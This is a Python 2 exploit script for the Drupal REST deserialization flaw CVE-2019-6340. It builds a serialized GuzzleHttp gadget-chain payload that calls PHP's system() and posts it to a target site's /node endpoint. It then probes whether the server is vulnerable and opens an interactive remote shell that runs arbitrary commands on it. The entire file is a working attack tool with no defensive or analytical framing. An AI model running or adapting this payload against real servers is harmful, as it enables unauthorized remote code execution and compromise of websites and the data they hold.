#!/usr/bin/python2
# -*- coding: utf8 -*-

import sys
import urllib2

def post_data(path, dataload):
	reqhead = {
		'content-type': 'application/hal+json',
		'Accept': '*/*',
		'User-Agent': 'Mozilla/5.0',
		'Accept-Language': 'en-US,en;q=0.5',
		'Accept-Encoding': 'gzip, deflate',
		'DNT': 1,
		'Pragma':"no-cache",
		'Cache-Control':'no-cache'
	}
	req = urllib2.Request(path, data=dataload, headers=reqhead)
	try:
		r = urllib2.urlopen(req, timeout=5)
		content = r.read()
	except urllib2.HTTPError as e:
		content = e.read()
	return content

def send_cmd(site, command):
	urlp = site + '/node/?_format=hal_json'
	cmdexec = command + ' 2>&1'
	payloadraw = '{"link":[{"value":"link","options":"O:24:\\"Guzzle'\
	'Http\\\\Psr7\\\\FnStream\\":2:{s:33:\\"\\u0000GuzzleHttp\\\\Psr7'\
	'\\\\FnStream\\u0000methods\\";a:1:{s:5:\\"close\\";a:2:{i:0;O:23'\
	':\\"GuzzleHttp\\\\HandlerStack\\":3:{s:32:\\"\\u0000GuzzleHttp\\'\
	'\\HandlerStack\\u0000handler\\";s:%i:\\"%s\\";s:30:\\"\\u0000Guz'\
	'zleHttp\\\\HandlerStack\\u0000stack\\";a:1:{i:0;a:1:{i:0;s:6:\\"'\
	'system\\";}}s:31:\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000cach'\
	'ed\\";b:0;}i:1;s:7:\\"resolve\\";}}s:9:\\"_fn_close\\";a:2:{i:0;'\
	'r:4;i:1;s:7:\\"resolve\\";}}"}],"_links":{"type":{"href":"%s\/re'\
	'st\/type\/shortcut\/default"}}}' % ( len(cmdexec), cmdexec, site )
	rsp = post_data(urlp, payloadraw)
	if rsp[-1] != "\n":
		return "Failure"
	return rsp

def get_output(full_response):
	end_resp = full_response.find('permissions."}') - 1
	if end_resp > 0:
		return full_response[end_resp+15:-1]
	else:
		return ""

def rem_shell(domain, cmd):
	rsp = send_cmd(domain, cmd)
	return get_output(rsp)

def testvuln(site):
	try:
		if get_output(send_cmd(site, 'echo ABCZ')) == 'ABCZ':
			print "\rThis server hosts a vulnerable Drupal            "
			return 1
	except:
		pass
	return 0

if __name__ == "__main__":
	if len(sys.argv)!=2 or not sys.argv[1].startswith("http"):
		print "\nUse : DRS2.py http[s]://hostname|IP[:port]\n"
		sys.exit()
	target = sys.argv[1]
	print '\n#########################################################'
	print '#                                                       #'
	print '#   Drupal Remote Shell 2 using CVE-2019-6340           #'
	print '#   Use : DRS2.py HostPath                              #'
	print '#   https://github.com/antonio-fr/DrupalRS              #'
	print '#                                                       #'
	print '#########################################################\n'
	dmn = target.split("://")[1]
	print "Testing",dmn,"WAIT ...",
	version = testvuln(target)
	if version != 1:
		print "\rThis server doesn't host a vulnerable Drupal         "
		sys.exit()
	print "Connected to",dmn
	print "# CTRL+D to quit\n"
	while True:
		cmd = raw_input("[drupal@"+dmn+" ~]#")
		if cmd == "\x04":
			break
		print rem_shell(target, cmd)
	print "logout"
